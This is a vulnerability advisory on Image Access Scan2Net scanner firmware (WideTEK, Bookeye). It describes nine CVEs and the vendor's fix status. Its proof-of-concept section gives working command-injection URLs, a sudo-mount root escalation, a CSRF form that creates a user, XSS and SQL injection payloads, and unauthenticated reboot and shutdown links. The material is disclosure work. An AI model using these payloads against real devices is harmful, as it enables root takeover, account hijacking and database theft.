By

Daniel Hirschberger, Tobias Niemann (Office Bochum)

Multiple vulnerabilities allowed an unauthenticated attacker to execute arbitrary commands as root user on all devices over the network, which are running the Scan2Net software from Image Access. This mainly includes large paper format scanner like the WideTEK series. Additionally, an attacker could perform SQL injection to manipulate the database, perform a cross site request forgery attack to reset the administrator's password or create a new user, perform cross site scripting attacks to execute arbitrary JavaScript in the browser of victims and decrypt exported configurations and directly connect to the database because of hard-coded credentials across devices.

## Business recommendation

The vendor provides a firmware update to version 7.42B which should be installed immediately. SEC Consult could only partially verify the correction of all identified vulnerabilities. Some vulnerabilities have not been fixed by the vendor as the risk was accepted.

SEC Consult highly recommends to perform a thorough security review of the product conducted by security professionals to identify and resolve potential further security issues.

## Vulnerability overview/description

1) OS Command Injection (CVE-2024-28138)

An unauthenticated attacker with network access to the scanner can execute any system command via the "msg\_events.php" script as the www-data user.

2) Privilege Escalation (CVE-2024-28139)

The www-data user can elevate his privileges because sudo is configured to allow the execution of the mount command as root without a password. Therefore, the privileges can be escalated to the root user.

3) Violation of Least Privilege Principle (CVE-2024-28140)

The scanner boots into a kiosk mode by default and opens the Scan2Net interface in a browser window. This browser is run with the permissions of the root user. There are also several other applications running as root user, some of them are self-developed ones but those could not be exploited at first glance.

4) Cross-Site Request-Forgery (CSRF) (CVE-2024-28141)

The web application is not protected against cross-site request forgery attacks. Therefore, an attacker can trick users into performing actions on the application when they visit an attacker-controlled website or click on a malicious link.

5) Stored Cross-Site-Scripting (XSS) (CVE-2024-28142, CVE-2024-47947)

Due to missing input sanitization, an attacker can perform cross-site-scripting attacks and run arbitrary Javascript in the browser of other users.

6) Insecure Password Change Function (CVE-2024-28143)

The password change function does not require the current password, which makes the application vulnerable to account takeover, especially if combined with the CSRF vulnerability.

7) Broken Access Control (CVE-2024-28144)

Due to missing access control on the reboot and shutdown functions, an attacker can perform a denial-of-service attack against the application. Furthermore, an attacker who can spoof the IP address and the User-Agent of a logged-in user can takeover the session because of flaws in the self-developed session management.

8) Unauthenticated SQL Injection (CVE-2024-28145)

An unauthenticated attacker can perform an SQL injection by accessing the dbconnector.php file and supplying malicious GET parameters.

9) Hard-coded Credentials (CVE-2024-28146)

The application uses several hard-coded credentials for protecting the firmware update file and the installed database server.

By April 2024, ImageAccess GmbH provided us with an internet-facing test device and we spent some short time verifying the vulnerabilities in their latest firmware (7.40) which should fix the security issues according to the vendor. Unfortunately, most of them are still present and new ones have been discovered.

#### Update 2024-04-02 in short:

1) OS Command Injection (CVE-2024-28138, CVE-2024-47946)

Fixed, but a new RCE vulnerability has been discovered which requires a session as Poweruser, updated PoC below. The second RCE issue is tracked as CVE-2024-47946.

2) Privilege Escalation (CVE-2024-28139)

Still an issue.

3) Violation of Least Privilege Principle (CVE-2024-28140)

Still an issue.

4) Cross-Site Request-Forgery (CSRF) (CVE-2024-28141)

Fixed. The introduced "session\_id" cookie is protected with the "SameSite=Strict" cookie flag. This prevents CSRF attacks.

5) Stored Cross-Site-Scripting (XSS) (CVE-2024-28142, CVE-2024-47947, CVE-2024-36498)

Original issues are fixed (CVE-2024-28142, CVE-2024-47947), but we discovered a new one, updated PoC below. The new XSS is tracked as CVE-2024-36498.

6) Insecure Password Change Function (CVE-2024-28143)

Fixed. The password change function now requires the current password.

7) Broken Access Control (CVE-2024-28144)

Still an issue.

If two users access the web interface from the same IP they are logged in as the other user. Updated PoC below.

8) Unauthenticated SQL Injection (CVE-2024-28145, CVE-2024-50584)

Original issue fixed, but a new blind SQLi as Poweruser has been found, updated PoC below. The new SQLi is tracked as CVE-2024-50584.

9) Hard-coded Credentials (CVE-2024-28146)

Still an issue, credentials can be found in different files.

By October 2024 ImageAccess GmbH provided us with an internet-facing test device and we spent some short time verifying the vulnerabilities in their latest firmware (7.42) which should fix the submitted critical security issues according to the vendor.

#### Update 2024-10-14 in short:

1) OS Command Injection (CVE-2024-28138, CVE-2024-47946)

The new RCE vulnerability is fixed now.

2) Privilege Escalation (CVE-2024-28139)

Still an open issue. The risk has been accepted by the vendor because the other critical issues are fixed and shell access is not easily possible anymore.

3) Violation of Least Privilege Principle (CVE-2024-28140)

The kiosk browser is no longer running as root but many other custom services still are.

4) Cross-Site Request-Forgery (CSRF) (CVE-2024-28141)

Fixed.

5) Stored Cross-Site-Scripting (XSS) (CVE-2024-28142, CVE-2024-47947, CVE-2024-36498, CVE-2024-36494

The third XSS (CVE-2024-36498) has also been fixed. We discovered a new XSS vulnerability in the login page which only works if the target user is \_not\_ already logged in, which makes it ideal for login form phishing attempts. The new XSS is tracked as CVE-2024-36494.

6) Insecure Password Change Function (CVE-2024-28143)

Fixed. The password change function now requires the current password.

7) Broken Access Control (CVE-2024-28144)

Still an issue.

8) Unauthenticated SQL Injection (CVE-2024-28145, CVE-2024-50584)

The blind SQLi as Poweruser has been fixed.

9) Hard-coded Credentials (CVE-2024-28146)

Mostly fixed. Many credentials can be found in different files. The most problematic 'support' user had their password rotated and it was not immediately obvious where it is stored now.

Figure 1: Output of the "id" command

## Proof of concept

### 1) OS Command Injection (CVE-2024-28138, CVE-2024-47946)

An unauthenticated attacker with network access can execute arbitrary commands by visiting the following URL. The HTTP GET parameter "data" is not properly sanitized:

```
https:// $SCANNER/class/msg_events.php?action=writemsgfifo&data=;$COMMAND
```

For example, the following URL can be used to display information about the current user of the web server:

```
https:// $SCANNER/class/msg_events.php?action=writemsgfifo&data=;id
```

The following image (figure 1) shows the output of the command:

![](/fileadmin/user_upload/sec-consult/Dynamisch/Advisories/2024_12/sec-consult-c-imageaccess-01_os_command_injection_new.png)

Figure 2: Command Injection

**Update 2024-04-02: The second issue is now tracked as CVE-2024-47946.**

The OS command injection as shown above is no longer possible in the new firmware version 7.40. Another possibility to gain remote code execution has been identified if the attacker has access to a valid Poweruser session. Specifically crafted valid PNG files with injected PHP content can be uploaded as desktop backgrounds or lock screens. After the upload, the PHP script is available in the web root. The PHP script executes once the uploaded file is accessed. This allows the execution of arbitrary PHP code and OS commands on the device as "www-data".

Figure 3: Sudo -L command

![](/fileadmin/_processed_/8/9/csm_sec-consult-c-imageaccess-02-sudo_mount_aeebd1157b.png)

Figure 4: Sudo mount

### 2) Privilege Escalation (CVE-2024-28139)

By executing the command "sudo -l" as the www-data user, it is apparent that this user can be used to escalate privileges to root, as shown in figure 3.

The following commands can be executed to elevate to root privileges, as shown in the figure 4.

```
> sudo mount -o bind /usr/bin/bash /usr/bin/mount
> sudo mount
```
![](/fileadmin/_processed_/3/1/csm_sec-consult-c-imageaccess-04_register_user_result_bc6a6a0a78.png)

Figure 5: Register user result

### 3) Violation of Least Privilege Principle (CVE-2024-28140)

Many processes are running with root privileges which violates the principle of Least Privilege.

This can be confirmed by running "ps aux" as the root user and observing the output:

```
root  /opt/s2n/bin/S2NBrowserV7 --no-sandbox StartUpSelection.html x:0 y:800 w:1920 h:1080
root   \_ /usr/lib/x86_64-linux-gnu/qt5/libexec/QtWebEngineProcess --type=zygote --no-sandbox --lang=en-US
root       \_ /usr/lib/x86_64-linux-gnu/qt5/libexec/QtWebEngineProcess --type=zygote --no-sandbox --lang=en-US
[...]
```

Apart from the browser the following binaries are also run with root permissions:

```
vsftpd, smbd, wsdd.py, X11, OpenBox
s2n-specific Binaries (copyd, s2ncopy, ocrd, imaged, camd_ucc1, admind, s2nwdd,ledd, wt36keyb, ...)
```
### 4) Cross-Site Request-Forgery (CSRF) (CVE-2024-28141)

The application offers no protection against Cross-Site Request-Forgery. An attacker can therefore forge malicious links to reset the admin password or create new users.

#### 4.1) Reset Admin Password

The following link resets the password of the administrator to the value "CSRF2YOU!". The password is base64-encoded (Q1NSRjJZT1Uh).

```
https:// $SCANNER/cgi/admin.cgi?-rsetpass+-aaction+-1Q1NSRjJZT1Uh+-2adm
```
####

#### 4.2) Register a new user

The following code can be hosted on a malicious page controlled by the attacker. When a user who is logged in as administrator is lured by the attacker to visit this page, a new user "SECtest" with the password "CSRF2YOU!" is automatically created:

```
<html>
 <body>
   <form action="https://$SCANNER/cgi/upuserdata.cgi" method="POST">
     <input type="hidden" name="groupid" value="0" />
     <input type="hidden" name="username" value="SECtest" />
     <input type="hidden" name="pw1" value="CSRF2YOU!" />
     <input type="hidden" name="pw2" value="CSRF2YOU!" />
     <input type="submit" value="Submit request" />
   </form>
   <script>document.forms[0].submit();</script>
 </body>
</html>
```

The following image shows the result:

![](/fileadmin/user_upload/sec-consult/Dynamisch/Advisories/2024_12/sec-consult-c-imageaccess-05-1_xss_scenario_1.png)

![](/fileadmin/_processed_/6/6/csm_sec-consult-c-imageaccess-05-2_xss_scenario_1_triggered_69a9c41757.png)

Figure 7: XSS Scenario 1 triggered

### 5) Stored Cross-Site-Scripting (XSS) (CVE-2024-28142, CVE-2024-47947, CVE-2024-36498, CVE-2024-36494)

There are at least two identified injection points:

#### 5.1) Scenario 1: Stored XSS via User Settings -> File Name (CVE-2024-28142)

a. Login as Scan2Net User.
b. Navigate to User Settings -> File Name (https://$SCANNER/cgi/uset.cgi?-cfilename)
c. Edit the "Wildcard Character" %2 setting to contain the following payload and reference it in the file name:

```
> <script>alert(document.location)</script>
```

d. The JavaScript payload will be saved automatically.
e. The payload will be triggered on each visit of the User Settings -> File Name page.

It is also executed when an admin visits the following page:

```
https:// $SCANNER/cgi/uset.cgi?-cfilename
```

This attack can even be performed without being logged in because the affected functions are not fully protected. Without logging in, only the file name parameter of the "Default" User can be changed. However, the wildcards can be changed without authentication. To inject the payload, the following two requests have to be submitted.

I. Changing the file name of the "Default" user to scan\_xss%2.pdf:

```
https:// $SCANNER/cgi/chopt.cgi?uset+save_filename+scan_xss%252.pdf+filename+Default
```

II. Changing the Wildcard %2 to the JavaScript payload:

```
https:// $SCANNER/cgi/chopt.cgi?fileabb+fileabb_customvalue2+%3Cscript%3Ealert(document.location)%3C/script%3E
```

Figure 10: XSS scenario 2 (trigger touch)

#### 5.2) Scenario 2: Stored XSS via the ScanWizard Disclaimer (CVE-2024-47947)

The "Edit Disclaimer Text" function of the configuration menu is also vulnerable. Only the users Poweruser and Admin can use this function which is available at the URL

```
https:// $SCANNER/cgi/admin.cgi?-rdisclaimer+-apre
```

The JavaScript can be inserted as shown in figure 8.

Afterwards, this change has to be applied by clicking on the "Apply" button. From now on the payload will be executed every time the ScanWizard is loaded. The URL of the ScanWizard interface is: [$SCANNER/ScanWizard.html](https://$SCANNER/ScanWizard.html) (see figure 9).

This also includes the ScanWizard which is displayed in the Kiosk-mode browser which is present on the physical touch-enabled display of the scanner itself (see figure 10).

**Update 2024-04-02:**

The third issue is now tracked as CVE-2024-36498. The following text can be inserted as Poweruser into the disclaimer to exploit this issue:

```
%3c%53%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%53%63%72%69%70%74%3e
```

This is the payload <Script>alert(1)</Script> URL-encoded.

**Update 2024-10-14:**

The fourth issue is now tracked as CVE-2024-36494. A new reflected XSS, which only works on unauthenticated targets, has been found:

```
https:// $SCANNER/cgi/slogin.cgi?-tsetup+-uuser%22%20onfocus%3ddocument.body.innerHTML%2B%3dlocation.hash,document.body.innerHTML%2b%3ddocument.body.innerText%20autofocus%20b%3d#<img/src="x"onerror="alert(1)"&gt
```

**Update 2024-11-12:**

The vendor tells us that the latest identified XSS issue should be fixed with version 7.42B.

### 6) Insecure Password Change Function (CVE-2024-28143)

The password change function does not require the user to enter the old password in order to set a new one. As explained in the CSRF finding (4.1), an attacker can use this to forcefully set a new password for a user without knowing the old password. The following link sets the password of the user, who clicks on it, to the value "CSRF2YOU!" which is "1Q1NSRjJZT1Uh" when encoded with base64.

```
https:// $SCANNER/cgi/admin.cgi?-rsetpass+-aaction+-1Q1NSRjJZT1Uh+-2adm
```
### 7) Broken Access Control (CVE-2024-28144)

#### 7.1) Reboot and Shutdown functions

The functions "reboot" and "shutdown" can be called without any authorization checks nor any authentication:

```
https:// $SCANNER/cgi/shutdown.cgi
https:// $SCANNER/cgi/reboot.cgi
```

The authorization checks are also missing on the User Settings -> File Name and  the dbconnector as described in chapter 5.1 and 8 respectively.

Figure 11: Disclaimer

![](/fileadmin/_processed_/d/f/csm_sec-consult-c-imageaccess-07-2_authentication_error_3edb170a21.png)

Figure 12: Authentication error

#### 7.2) Broken Session Management

Scan2Net implements a custom algorithm for the session management. The algorithm is implemented the following way:

```
> SID1="$(/opt/s2n/bin/hide -s -e -i "$REMOTE_ADDR:$HTTP_USER_AGENT" -p $HOSTNAME)"
```

The result is stored in the database as the current session ID. On each access request to Scan2Net the SID1 is calculated and compared to the stored session ID in the database.  This also means that only one user can be logged in at any time.  Furthermore, an attacker who is able to spoof the IP address of a victim and knows the User Agent which was used to login, can take over the session of the victim.

**Update 2024-04-02: The session management is still broken.**

Start two browsers of your choice (this example will use Chrome and Firefox). Browse to [$SCANNER\_IP/cgi/config.cgi](https://$SCANNER_IP/cgi/config.cgi) in both browsers. Notice that you are not logged in in both ones and your "login level" is "Default". Login in Chrome as Poweruser. Refresh the page in Firefox and notice that your login level now displays "Poweruser".

Browse to https:// $SCANNER/cgi/slogin.cgi?-tsetup+-uPoweruser in Firefox and click on "Edit Disclaimer Text". You will get the following error message as seen in figure 11 and 12.

In Firefox browse to [$SCANNER\_IP/ScanWizard.html](https://$SCANNER_IP/ScanWizard.html), then [$SCANNER\_IP/cgi/setupmenu.cgi](https://$SCANNER_IP/cgi/setupmenu.cgi) and click on "Edit Disclaimer Text" once more. This time you can edit the disclaimer.

### 8) Unauthenticated SQL Injection (CVE-2024-28145, CVE-2024-50584)

An unauthenticated attacker can reach the database connector at the following URL:

```
https:// $SCANNER/class/dbconnect.php
```

The connector accepts several query parameters:

```
> action, search, table, field, value
```

Of those, the parameters search, table, field, and value are vulnerable against SQL injection. For example, one SQL injection can be performed on the parameter "field" with the UNION keyword. The following request returns the version of the used SQL database server by union selecting "@@version":

```
http:// $SCANNER/class/dbconnect.php?action=getdbvalue&search=singlemode&table=user_touchscreen&field=configuration_name%20UNION%20ALL%20SELECT%20@@version--%20-&value=ScanWizard
```

The web server responds with:

```
> HTTP/1.1 200 OK
> […]
> 10.3.38-MariaDB-0+deb10u1
```

The database is accessed with the rights of the user "s2n".

**Update 2024-04-02**

The second issue is now tracked as CVE-2024-50584. The injection point shown above has been fixed in the new firmware (7.40), but a new exploitable injection point was discovered in template\_io.php. An attacker with an active session as Poweruser can access the following URL:

```
https:// $SCANNER/class/template_io.php
```

The PHP script processes the following query parameters:

```
> action, table, templates
```

The templates parameter is vulnerable against blind boolean-based SQL injection attacks. SQL syntax must be injected into the JSON syntax of the templates parameter. As a short proof of concept the following three requests can be sent:

```
https:// $SCANNER/class/template_io.php?action=export&table=printer&templates={"0":"default"}
https:// $SCANNER/class/template_io.php?action=export&table=printer&templates={"0":"default'+AND+1337=1336--+A"}
https:// $SCANNER/class/template_io.php?action=export&table=printer&templates={"0":"default'+AND+1337=1337--+A"}
```

For the 1st (no injection) and 3rd (true condition) request the server responds with the identical ZIP file in the response:

```
> HTTP/1.1 200 OK
> […]
> Content-Length: 1699
> PK[…]
```

Only the response from the 2nd request (false condition) differs in length and content.  This indicates that the injected SQL is processed by the database:

```
> HTTP/1.1 200 OK
> […]
> Content-Length: 1268
> PK[…]
```

The vulnerability was successfully exploited to exfiltrate data from the connected database. As before, the database is accessed with the db user "s2n".

### 9) Hard-coded Credentials (CVE-2024-28146)

After obtaining root access to the scanner, the system could be examined and checked for hard-coded credentials. The found credentials are used to encrypt config files during backup, decrypt the new firmware during an update and some of the listed passwords allow a direct connection to the database server of the scanner.

```
| File                                | Usage                         | Username | Password      |

## Vulnerable / tested versions

The following version has been tested which was the latest version available at the time of the test in 2023:

* Firmware 7.31L on a WideTEK 36CL-600 Scanner

All previous versions of Scan2Net before 7.40 are affected, which are used in WideTEK or Bookeye scanners.

SEC Consult was provided access to a patched scanner device by the vendor with firmware 7.40 in March 2024. It was briefly verified whether the security issues were properly fixed, but it was identified that most security issues are still present in the latest version.

Furthermore, the most recent firmware version 7.42 was rechecked in October 2024. Most critical security issues have been fixed, but some issues are still open.
